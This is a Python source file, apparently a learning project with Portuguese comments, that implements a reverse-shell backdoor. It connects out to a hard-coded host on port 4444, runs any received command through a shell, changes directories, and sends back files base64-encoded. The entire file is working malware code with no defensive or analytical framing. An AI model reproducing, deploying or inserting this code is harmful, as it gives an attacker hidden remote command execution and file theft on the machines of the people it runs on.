import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def serial_send(self, data):
        json_data = json.dumps(data)
        self.s.send(json_data.encode())

    def serial_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.s.recv(1024)
                return json.loads(json_data)
            except ValueError:  # Se o json não estiver completo
                continue

    def change_directory(self, path):
        os.chdir(path)
        new_directory = os.getcwd()
        return f"[+] Mudança para {new_directory}"

    def execute_command(self, command):
        return (subprocess.check_output(command, shell=True)).decode('utf-8',
                                                                     errors="ignore")  # O comando retorna um tipo byte, por isso é necessário decodificar para string

    def read_file(self,path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def start(self):
        while (1):
            comando = self.serial_receive()
            if comando[0] == ":q":  # comando pode ser tratado como lista por vir de um json
                self.stop()
                break
            elif comando[0] == "cd" and len(comando) > 1:
                exec_result = self.change_directory(comando[1])
            elif comando[0] == "download" and len(comando) > 1:
                exec_result = self.read_file(comando[1])
                exec_result = exec_result.decode('utf-8', errors="ignore")
            else:
                exec_result = self.execute_command(comando)
            self.serial_send(exec_result)

    def stop(self):
        self.s.close()


bckdr = Backdoor("192.168.0.102", 4444)
bckdr.start()
